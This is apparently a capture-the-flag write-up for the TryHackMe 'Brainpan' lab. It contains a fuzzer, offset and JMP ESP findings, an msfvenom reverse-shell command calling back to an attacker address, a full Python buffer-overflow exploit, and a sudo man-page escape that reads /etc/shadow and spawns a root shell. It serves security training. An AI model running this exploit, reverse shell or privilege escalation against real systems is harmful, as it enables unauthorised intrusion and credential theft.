// Overview

Brainpan is a TryHackMe room that focuses on exploiting a traditional stack-based buffer overflow. It features a Windows program called brainpan.exe which runs on a Linux system via Wine and has a vulnerable service on port 9999. The goal is to obtain root access, since this serves as the completion proof.

The room is rated Hard and includes:

  • Manual buffer overflow exploitation
  • Reverse engineering a Windows binary
  • Generating custom shellcode with MSFvenom
  • Getting a reverse shell as the puck user
  • Escalating privileges using anansi_util

View room on TryHackMe →

Note: Traditional flags are not present in this room. Instead, the aim is to obtain root access, which can be proven by reading /etc/shadow.

// Phase 1: Reconnaissance

We begin with a standard Nmap scan:

nmap -sC -sV -p- <target_ip>

The results show two open ports:

PORT      STATE SERVICE  VERSION
9999/tcp  open  abyss?   (custom Windows binary)
10000/tcp open  http     SimpleHTTPServer 0.6 (Python 2.7.3)

Accessing the web server on port 10000, a directory listing is revealed at /bin/ containing brainpan.exe:

curl http://<target_ip>:10000/bin/

We download the binary for local analysis:

wget http://<target_ip>:10000/bin/brainpan.exe

Connecting to port 9999 via netcat presents a password prompt:

nc <target_ip> 9999

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD

The fact that there are no limits on input length is a typical sign of a buffer overflow vulnerability.

// Phase 2: Buffer Overflow

Fuzzing the Service

We write a fuzzer to find the approximate crash point:

#!/usr/bin/env python3
import socket
import sys
import time

def fuzz(target_ip, target_port=9999):
    buffer = b"A" * 100
    step = 100

    while len(buffer) <= 3000:
        try:
            print(f"[+] Sending {len(buffer)} bytes...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, target_port))

            try:
                banner = s.recv(1024)
                print(f"[+] Banner received")
            except:
                pass

            s.send(buffer + b"\n")

            try:
                response = s.recv(1024)
                print(f"[+] Response: {response[:50]}")
            except socket.timeout:
                print(f"[!] Timeout at {len(buffer)} bytes")
                sys.exit()

            s.close()
            time.sleep(0.5)
            buffer += b"A" * step

        except ConnectionResetError:
            print(f"[!] Connection reset at {len(buffer)} bytes - crashed!")
            sys.exit()
        except Exception as e:
            print(f"[!] Error: {e}")
            sys.exit()

if __name__ == "__main__":
    fuzz("<target_ip>")

The service crashes around 700 bytes.

Finding the Offset

We generate a 600-byte cyclic pattern using Metasploit's pattern_create:

msf-pattern_create -l 600

We send the pattern and then obtain the EIP value from the crash. By using the offset tool:

msf-pattern_offset -l 600 -q <EIP_value>

Offset confirmed: 524 bytes

Verifying the offset: We confirm that we have control over EIP by sending A*524 + BBBB. If the service crashes and EIP shows 42424242 (BBBB), then the offset is correct.

Finding JMP ESP

We search the binary for a JMP ESP instruction using objdump:

objdump -d brainpan.exe | grep -A5 -B5 "ff e4"

The output reveals the _winkwink function at 0x311712f0, containing a JMP ESP at 0x311712f3:

311712f0 <_winkwink>:
311712f0: 55                    push   %ebp
311712f1: 89 e5                 mov    %esp,%ebp
311712f3: ff e4                 jmp    *%esp

The return address is 0x311712f3, written in little-endian as \xf3\x12\x17\x31.

EIP overwrite: We set EIP to 0x311712f3 in order to redirect the execution to the stack where our shellcode is located.

// Phase 3: Payload Generation

The target runs a Windows binary through Wine, so we generate a Windows reverse shell payload:

msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 EXITFUNC=thread -b "\x00" -f python

Final Exploit

#!/usr/bin/env python3
import socket
import sys

# Configuration
TARGET_IP = "<target_ip>"
TARGET_PORT = 9999
LHOST = "<attacker_ip>"
LPORT = 4444

# Exploit values
OFFSET = 524  # Verify with A*offset + BBBB
JMP_ESP = b"\xf3\x12\x17\x31"

# Windows reverse shell (paste msfvenom output here)
buf =  b""
buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52..."
# ... full shellcode here

payload = b"A" * OFFSET + JMP_ESP + b"\x90" * 16 + buf

print("[+] Sending exploit...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((TARGET_IP, TARGET_PORT))
banner = s.recv(1024)
print(f"[+] Connected: {banner[:50]}...")
s.send(payload + b"\n")
print("[+] Payload sent! Check your listener.")
s.close()

// Phase 4: Reverse Shell

We set up a listener and run the exploit:

nc -lvnp 4444

The shell connects back as the puck user. Since the environment is a hybrid Windows/Linux Wine shell, commands like whoami and bash are not reliable. Nevertheless, it is still possible to carry out we can still enumeration and gain higher privileges.

The shell banner confirms the environment:

CMD Version 1.4.1

Z:\home\puck>

// Phase 5: Privilege Escalation

We attempt to check sudo permissions (if the Linux shell works properly):

sudo -l

The output shows:

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util

The anansi_util binary includes a manual command that opens man pages. We can use this to read root-only files and prove access:

/usr/bin/sudo /home/anansi/bin/anansi_util manual /etc/shadow

This successfully displays /etc/shadow, containing the root password hash. This is clear proof of root access.

To try for a full root shell, we can open a man page and escape using the ! command:

/usr/bin/sudo /home/anansi/bin/anansi_util manual man
!/bin/bash
Wine quirk: The !/bin/bash escape might fail in the hybrid environment. If that happens, reading /etc/shadow still serves as valid proof of root access.

// Key Takeaways

Buffer overflows remain significant. Knowing how memory corruption exploits work is a fundamental skill for penetration testers.
Wine complicates exploitation. Running a Windows binary on Linux brings issues like unstable shells, missing commands, and unexpected behaviours.
GTFOBins saves the day. The man page escape via !/bin/bash is a common method for escalating privileges.
Debug strings offer clues. The _winkwink function name and the debug password shitstorm hinted at the binary's inner workings.
Offset verification matters. Different instances may giveoffsets of 520 or 524; always confirm with A*offset + BBBB.
